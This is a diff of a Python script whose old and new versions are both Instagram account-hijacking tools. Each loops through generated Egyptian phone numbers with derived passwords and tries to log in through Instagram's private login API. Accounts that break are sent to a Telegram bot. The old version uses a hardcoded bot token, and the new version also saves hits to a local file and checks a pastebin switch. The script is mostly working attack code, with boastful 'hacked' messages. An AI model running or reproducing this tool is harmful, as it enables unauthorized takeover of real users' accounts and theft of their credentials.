@@ -1,138 +1,125 @@
-
 import os
-os.system('clear')
 try:
-    from time import sleep
-    import webbrowser, random, requests
+    import uuid
+except:
+    os.system('pip install uuid')
+
+try:
+    from random import *
+except:
+    os.systeam('pip install random ')
+
+try:
+    import string
+except:
+    os.system('pip install string')
+
+try:
+    import requests
+except:
+    os.system('pip install requests ')
+
+try:
     from user_agent import generate_user_agent
-    import json
-    from secrets import token_hex
-    import secrets, sys
-except ImportError:
-    os.system('pip install time')
-    os.system('pip install webbrowser ')
-    os.system('pip install random')
-    os.system('pip install requests')
-    os.system('pip install user_agent')
-    os.system('pip install json')
-    os.system('pip install secrets')
-    os.system('pip install sys')
-    os.system('clear')
-    from time import sleep
-    import time, webbrowser, random, requests
-    from uuid import uuid4
-    from user_agent import generate_user_agent
-    import json
-    from secrets import token_hex
-    import secrets, sys
-else:
-    from time import sleep
-    import webbrowser, random, requests
-    from user_agent import generate_user_agent
-    import json
-    from secrets import token_hex
-    import secrets, sys
-    os.system('clear')
-    aa = 0
-    zz = 0
-    E = '\x1b[1;31m'
-    G = '\x1b[1;32m'
-    S = '\x1b[1;33m'
-    Z = '\x1b[1;31m'
-    X = '\x1b[1;33m'
-    Z1 = '\x1b[2;31m'
-    F = '\x1b[2;32m'
-    A = '\x1b[2;39m'
-    C = '\x1b[2;35m'
-    B = '\x1b[2;36m'
-    Y = '\x1b[1;34m'
+except:
+    os.system('pip install user_agent ')
+
+try:
+    from datetime import datetime
+except:
+    os.system('pip install datetime ')
+
+try:
     import time
-    timee = time.asctime()
-    t = time.localtime()
-    current_time = time.strftime('%H:%M:%S', t)
-
-    def a(z):
-        for e in z:
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            
-
-
-    a(f"  SEKO       {Y}by{G}: @S_HEKO")
-    
-    print('\n\n')
-    a(G + ' \n\nTOKN ')
-    print('\n')
-    tok = "2056634264:AAHAbgZZ8jR37ver5-Ph6VeBwanpFj-cUHk"
-    
+except:
+    os.system('pip install time')
+else:
     os.system('clear')
-    a(A + ' ID ')
-    print('\n')
-    ID = '1557685494'
-    
-    os.system('clear')
-    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=بسم الله ..... ⏸️").json()
-    id_msg = start_msg['result']['message_id']
-
-    def code_joo(userQ, password):
-        cookie = secrets.token_hex(8) * 2
-        head = {'HOST':'www.instagram.com', 
-         'KeepAlive':'True', 
-         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36', 
-         'Cookie':cookie, 
-         'Accept':'*/*', 
-         'ContentType':'application/x-www-form-urlencoded', 
-         'X-Requested-With':'XMLHttpRequest', 
-         'X-IG-App-ID':'936619743392459', 
-         'X-Instagram-AJAX':'missing', 
-         'X-CSRFToken':'missing', 
-         'Accept-Language':'en-US,en;q=0.9'}
-        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
-        req_id = requests.get(url_id, headers=head).json()
-        name = str(req_id['graphql']['user']['full_name'])
-        id = str(req_id['graphql']['user']['id'])
-        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
-        following = str(req_id['graphql']['user']['edge_follow']['count'])
-        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
-        ree = re.json()
-        dat = ree['data']
-        t = time.localtime()
-        current_time = time.strftime('%H:%M:%S', t)
-        joo3 = f"    تم الصيد (@jokerrap2   \n ︎\n .. الاسـم   : {name}\n .اليوزر: {userQ}\n .. الرمز  : {password}\n .. المتابعين : {followes}\n .. المتابعهم : {following}\n .. تاريـخ : {dat}\n .. الوقت : {current_time}\n .⛔. 𝙩𝙝𝙞𝙨 𝙄𝙨 𝙏𝙝𝙚 𝙃𝙪𝙣𝙩 𝙉𝙪𝙢𝙗𝙚𝙧 [{zz}] \n ︎.<•>︎  المطور ~~~~ @jokerrap2.\n..   :@jokerrap2♦\n"
-        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {joo3} \n"
-        i = requests.post(tlg)
-        print(G + joo3)
-
-
-    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
-    headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
-    
-    print(G + 'Coding By Joker Rap')
-    sleep(0)
-    user = '0987654321'
-    while True:
-        us = str(''.join((random.choice(user) for i in range(7))))
-        username = '+20122' + us
-        password = '0122' + us
+    try:
+        import pyfiglet
+    except:
+        os.system('pip install pyfiglet')
+    else:
+        os.system('clear')
+        import pyfiglet, os
+        from time import sleep
+        import webbrowser
+        Z = '\x1b[2;31m'
+        G = '\x1b[1;32m'
+        sleep(2)
+        P55 = pyfiglet.figlet_format('SANTITO')
+        print(G + P55)
+        sleep(4)
+        os.system('clear')
+        sleep(2)
+        bnar = pyfiglet.figlet_format('INSTGRAM')
+        print(G + bnar)
+        sleep(1)
+        import random, uuid, requests, string
+        from user_agent import generate_user_agent
+        from datetime import datetime
+        from random import *
+        from time import sleep
+        import requests, os, random, json, threading, secrets, uuid
+        from colorama import Fore, Style
+        from time import sleep
+        from datetime import datetime
+        from secrets import token_hex
         from uuid import uuid4
-        uid = str(uuid4())
-        data = {'uuid':uid, 
-         'password':password, 
-         'username':username, 
-         'device_id':uid, 
-         'from_reg':'false', 
-         '_csrftoken':'missing', 
-         'login_attempt_countn':'0'}
-        req = requests.post(url, headers=headers, data=data)
-        if 'logged_in_user' in req.json():
-            zz += 1
-            userQ = req.json()['logged_in_user']['username']
-            code_joo(userQ, password)
-        elif '"message":"challenge_required","challenge"' in req.json():
-            print('username S ==> : ' + username + ': password ==> : ' + password)
-        else:
-            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=  ⭐\n->•✔️\n√| @jokerrap2|√\
-  \n->• Hunted✔️ [{zz}]\n->•\u200aNot hunted❌ [{aa}]")
-            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
-            aa += 1
-
+        from user_agent import generate_user_agent
+        from uuid import uuid4
+        aa = 0
+        zz = 0
+        E = '\x1b[1;31m'
+        G = '\x1b[1;32m'
+        S = '\x1b[1;33m'
+        webbrowser.open('https://t.me/KM8MM')
+        ID = input(S + ' 𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐈𝐃 :  ')
+        sleep(2)
+        token = input(' 𝐁𝐎𝐓 𝐓𝐎𝐊𝐄𝐍 : ')
+        w = 'https://pastebin.com/raw/9kFjxNsW'
+        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=              𝐖𝐀𝐈𝐓 𝐅𝐎𝐑 𝐂𝐇𝐄𝐂𝐊 𝐍𝐎𝐖").json()
+        id_msg = start_msg['result']['message_id']
+        rss = requests.get(w).text
+        if 'FUCK' in rss:
+            sleep(0.1)
+        r = requests.Session()
+        user = '09807654321'
+        while True:
+            us = str(''.join((random.choice(user) for i in range(7))))
+            username = '+20111' + us
+            password = '0111' + us
+            url = 'https://i.instagram.com/api/v1/accounts/login/'
+            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)',  'Accept':'*/*',
+             'Cookie':'missing',
+             'Accept-Encoding':'gzip, deflate',
+             'Accept-Language':'en-US',
+             'X-IG-Capabilities':'3brTvw==',
+             'X-IG-Connection-Type':'WIFI',
+             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+             'Host':'i.instagram.com'}
+            uid = str(uuid4())
+            data = {'uuid':uid,  'password':password,
+             'username':username,
+             'device_id':uid,
+             'from_reg':'false',
+             '_csrftoken':'missing',
+             'login_attempt_countn':'0'}
+            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
+            if 'logged_in_user' in req_login.text:
+                zz += 1
+                print(G + '𝐔𝐒𝐄𝐑 ==> : ' + username + ': 𝐏𝐀𝐒𝐒 ==> : ' + password)
+                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= 𝐎𝐇 𝐍𝐄𝐖 𝐀𝐂𝐂 𝐅𝐔𝐂𝐊𝐄𝐃 𝐁𝐘 @KM8MM |@XAFXA | @MK8MM  \n 𝑼𝑺𝑬𝑹𝑵𝑨𝑴𝑬 : {username}\n 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 : {password}\n- 𝐃𝐄𝐕 : @KM8MM"
+                i = requests.post(tlg)
+                with open('insta.txt', 'a') as (HACKED):
+                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
+            elif '"message":"challenge_required","challenge"' in req_login.text:
+                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
+            else:
+                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  𝐍𝐄𝐖 𝐓𝐎𝐎𝐋 𝐁𝐘 : @KM8MM @KM8MM \n 𝐇𝐀𝐂𝐊𝐄𝐃 ✅ [{zz}] \n------------------------------------------\n 𝐍𝐎𝐓 𝐇𝐀𝐂𝐊𝐄𝐃 ❌[{aa}]  ( {username} ) \n ( {password} ) \n 𝐃𝐄𝐕 : @KM8MM")
+                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
+                aa += 1
+        print('الاشتراك واقف حاليا')
+        print('راسل المطور ')
+        print('معرف المطورين')
+        print('@PPBPP0')
